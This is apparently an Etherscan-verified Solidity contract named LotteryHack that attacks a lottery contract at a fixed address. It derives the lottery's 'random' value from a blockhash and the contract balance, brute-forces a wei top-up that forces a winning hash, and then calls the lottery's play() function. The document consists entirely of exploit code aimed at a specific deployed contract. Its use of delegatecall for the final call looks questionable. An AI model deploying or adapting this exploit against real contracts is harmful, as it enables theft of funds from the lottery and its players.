/**
 *Submitted for verification at Etherscan.io on 2022-08-13
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract LotteryHack {
    address lottery = address(0x7A5DA6af69656223E830F1acAb6bC350Caf548AB);

    function win() external payable {
        require(msg.value == 0.01 ether);

        uint _diff = 0;
        bytes32 _rand = rndSource();
        uint bal = lottery.balance;
        bytes32 _abc = keccak256(abi.encode(_rand, bal));

        while ((uint256(_abc) % 10000) > 0) {
            _diff = _diff + 3;
            _abc = keccak256(abi.encode(_rand, bal + _diff));
        }

        payable(lottery).transfer(_diff);

        (bool _success,) = lottery.delegatecall(abi.encodeWithSignature("play()"));

        require(_success, "NoFW");
    }

    function rndSource() public view returns (bytes32) {
        return blockhash(block.number - (block.number % 200));
    }
}